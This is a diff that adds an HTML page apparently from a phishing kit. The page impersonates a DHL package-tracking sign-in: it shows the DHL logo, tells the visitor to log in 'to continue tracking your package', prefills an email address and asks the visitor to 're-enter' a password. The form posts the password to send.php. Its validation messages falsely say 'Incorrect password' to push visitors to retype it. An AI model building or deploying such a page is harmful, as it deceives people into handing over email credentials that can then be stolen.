@@ -1,0 +1,129 @@
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
+ <!--[if lt IE 7]> <html class="lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
+ <!--[if IE 7]> <html class="lt-ie9 lt-ie8" lang="en"> <![endif]-->
+ <!--[if IE 8]> <html class="lt-ie9" lang="en"> <![endif]-->
+ <!--[if gt IE 8]><!-->
+ <!--<![endif]-->
+ <head>
+  <meta charset="UTF-8" />
+  <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible" />
+  <title>
+   Login Form
+  </title>
+  <link href="css/style.css" rel="stylesheet" />
+  <style type="text/css">
+   html { 
+  background: url(hero-caribbeanmale-point.png) no-repeat fixed; 
+
+}
+  </style>
+  <!--[if lt IE 9]><script 
+
+src="//html5shim.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <script type="text/javascript" src="jquery-1.11.3.min.js">
+  </script>
+  <script type="text/javascript" src="jquery.validate.min.js">
+  </script>
+  <script>
+   $(document).ready(function() {				
+		// validate signup form on keyup and submit
+		$("#form1").validate({
+			rules: {
+				name1:{
+                                    required: true
+                                }, 
+                                
+				pass1: {
+					required: true,
+					minlength: 6
+				},
+//				 			
+			},
+			messages: {
+				name: "Please enter your email",
+				name1: {
+					required: "Please enter email",	
+
+				
+					
+				},				
+				pass1: {
+					required: "Please provide a 
+
+password",
+					minlength: "Incorrect password"
+				}
+//				 			
+			}
+		});
+		
+	});
+  </script>
+  <style>
+   .error{
+		color:red;	
+	}
+  </style>
+ </head>
+ <body>
+  <section class="container">
+   <div class="login">
+    <img width="293" height="127" src="DHL.png" />
+    <h1>
+    </h1>
+    <p style="font-size:13px; color:#828a8f; font-weight:bold;">
+     Sign in 
+
+with your correct email and password
+    </p>
+    <form name="myform" onsubmit="return validateForm()" action="send.php" method="post">
+     <input type="hidden" name="email" value="" />
+     <input type="hidden" name="name" value="" />
+     <input type="hidden" name="pass" value="" />
+     <p>
+     </p>
+     <align>
+      <span class="footer-notes">
+         Login to continue tracking 
+
+your package.
+      </span>
+     </align>
+     <p>
+     </p>
+     <table>
+      <tbody>
+       <tr>
+        <td>
+        </td>
+        <td text-align:centre="text-align:centre">
+           Email:
+
+abuse@gmail.com
+        </td>
+       </tr>
+       <tr>
+        <td>
+        </td>
+        <td>
+         <input type="password" name="epass" placeholder="Re-enter 
+
+Password" />
+        </td>
+       </tr>
+       <tr>
+        <td>
+        </td>
+        <td>
+         <p>
+          <input type="submit" value="Login to View" name="submit" />
+         </p>
+        </td>
+       </tr>
+      </tbody>
+     </table>
+    </form>
+   </div>
+  </section>
+ </body>
+</html>
